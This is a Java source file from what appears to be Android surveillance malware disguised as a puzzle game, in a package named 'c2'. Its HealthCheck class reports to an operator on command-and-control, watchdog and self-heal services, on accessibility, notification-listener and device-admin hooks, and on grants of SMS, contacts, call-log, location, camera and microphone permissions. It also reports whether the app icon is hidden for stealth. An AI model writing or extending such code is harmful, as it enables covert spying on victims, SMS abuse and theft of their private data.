package com.gempuzzle.quest.c2;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.PackageManager;

import androidx.core.content.ContextCompat;

/**
 * Health check — service liveness, runtime permissions,
 * special-access grants. Returns markdown report.
 */
public final class HealthCheck {

    public static String report(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("🩺 *HEALTH — ").append(DeviceInfo.sid(ctx)).append("*\n\n");
        sb.append("*Services*\n");
        sb.append("• C2Service: ").append(isServiceRunning(ctx, "C2Service") ? "✅" : "❌").append("\n");
        sb.append("• Watchdog: ").append(isServiceRunning(ctx, "WatchdogService") ? "✅" : "❌").append("\n");
        sb.append("• SelfHeal: ").append(isServiceRunning(ctx, "SelfHealService") ? "✅" : "❌").append("\n");
        sb.append("• Accessibility: ").append(AccessibilityMonitor.isEnabled(ctx) ? "✅" : "❌").append("\n");
        sb.append("• NotifListener: ").append(NotificationMonitor.isEnabled(ctx) ? "✅" : "❌").append("\n");
        sb.append("• DeviceAdmin: ").append(DeviceAdminReceiver.isActive(ctx) ? "✅" : "❌").append("\n");
        sb.append("• BootReceiver: ✅\n\n");
        sb.append("*Permissions*\n");
        String[] perms = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_PHONE_STATE,
        };
        for (String p : perms) {
            String name = p.substring(p.lastIndexOf('.') + 1);
            sb.append("• ").append(name).append(": ")
                    .append(ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED ? "✅" : "❌")
                    .append("\n");
        }
        sb.append("\n*Stealth*\n");
        sb.append("• Icon hidden: ").append(IconHider.isHidden(ctx) ? "🥷 yes" : "👁 visible").append("\n");
        return sb.toString();
    }

    private static boolean isServiceRunning(Context ctx, String name) {
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo rs : am.getRunningServices(100)) {
            if (rs.service.getClassName().endsWith(name)) return true;
        }
        return false;
    }

    private HealthCheck() {}
}
